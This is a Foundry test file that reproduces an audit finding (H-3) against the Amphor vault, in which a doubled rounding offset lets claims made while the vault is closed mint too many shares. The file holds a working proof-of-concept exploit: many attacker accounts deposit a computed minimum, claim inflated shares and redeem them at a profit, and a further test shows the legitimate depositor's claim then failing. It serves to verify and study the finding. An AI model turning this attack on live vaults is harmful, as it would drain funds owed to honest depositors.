// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30918-h-3-exchange-rate-is-calculated-incorrectly-when-the-vault-i.sol";

/*//////////////////////////////////////////////////////////////
    Amphor — exchange rate calculated incorrectly when the vault is closed (H-3, #30918)

    previewSettle() already adds `+1` when it computes the stored
    totalAssetsSnapshotForDeposit/totalSupplySnapshotForDeposit. _convertToShares
    then adds a SECOND `+1` on top of those stored values when an individual
    later claims. Whenever the share price is above 1:1, this double-counted
    offset makes claiming DURING the closed period systematically more
    generous than the fair (single-`+1`) rate used to size the aggregate
    shares actually minted — an attacker can deposit the rounding-optimal
    minimum from many fresh accounts, claim inflated shares, and immediately
    redeem them at the fair open-vault rate for a real profit, funded out of
    the pool that legitimate depositors are owed.

    - test_exploit: drives the cheatcode-free Exploit end to end (the report's
      own numbers: 1e18-1 donation, 1e18 bootstrap, 10e18 legit deposit, 15e18
      legit request, 30 attacker accounts) and re-asserts the profit.
    - test_poolInsolvency_legitUserCantFullyClaim: shows the secondary harm —
      the claimable pool is drained by the attacker's inflated claims, so the
      legitimate user's later claim reverts (insufficient balance).
//////////////////////////////////////////////////////////////*/
contract AmphorExchangeRateTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        uint256 deposited = e.totalAttackerDeposited();
        uint256 redeemed = e.totalAttackerRedeemed();

        assertGt(redeemed, deposited, "attacker should redeem more than deposited");
        // Matches the finding's own PoC scale (reporter measured ~1.69 ETH profit
        // once the 1e18-1 donation is netted in).
        assertGt(redeemed, deposited + 1e18, "profit should exceed 1 asset-unit");
    }

    /// @notice Standalone rebuild mirroring the finding's PoC scenario and
    ///         numbers directly (no Exploit orchestrator), confirming the
    ///         same double-`+1` mismatch and profit independently.
    function test_directRebuild_attackerProfits() public {
        MockAsset asset = new MockAsset();
        Vault vault = new Vault(address(asset));
        ProtocolUser alice = new ProtocolUser();

        uint256 donation = 1e18 - 1;
        uint256 bootstrap = 1e18;
        uint256 usersDeposit = 10e18;
        uint256 usersRequest = 15e18;
        uint256 nAttackers = 30;

        asset.mint(address(this), donation + bootstrap);
        asset.mint(address(alice), usersDeposit + usersRequest);
        asset.approve(address(vault), type(uint256).max);

        asset.transfer(address(vault), donation);
        vault.deposit(bootstrap, address(this));
        alice.approveAndDeposit(vault, asset, usersDeposit);

        vault.close();
        alice.approveAndRequest(vault, asset, usersRequest);

        uint256 minToDeposit = (vault.lastSavedBalance() + 2) / (vault.totalSupply() + 2);

        AttackerAccount[] memory attackers = new AttackerAccount[](nAttackers);
        for (uint256 i = 0; i < nAttackers; i++) {
            attackers[i] = new AttackerAccount();
            asset.mint(address(attackers[i]), minToDeposit);
            attackers[i].approveAndRequest(vault, asset, minToDeposit);
        }

        vault.open(vault.lastSavedBalance());

        uint256 deposited = minToDeposit * nAttackers;
        uint256 redeemed;
        for (uint256 i = 0; i < nAttackers; i++) {
            (, uint256 out) = attackers[i].claimAndRedeem(vault, address(this));
            redeemed += out;
        }

        assertGt(redeemed, deposited, "attacker profits from the double +1 mismatch");
    }

    /// @notice Secondary harm: the aggregate `claimableSiloShares` pool is
    ///         sized by the FAIR rate but drained by the attacker's inflated
    ///         claims — so the legitimate user, claiming after, cannot get
    ///         everything they are owed.
    function test_poolInsolvency_legitUserCantFullyClaim() public {
        Exploit e = new Exploit();
        e.run(); // attacker claims + redeems first, draining the shared pool

        Vault vault = e.vault();
        ProtocolUser legitUser = e.users();

        // The legit user's honest 15e18 request should convert to a healthy
        // number of shares, but the pool the attacker just drained cannot
        // cover it in full.
        uint256 owed = vault.previewClaimDeposit(address(legitUser));
        assertGt(owed, vault.claimableSiloShares(), "pool should be short of what legit user is owed");

        vm.expectRevert();
        legitUser.claim(vault);
    }
}
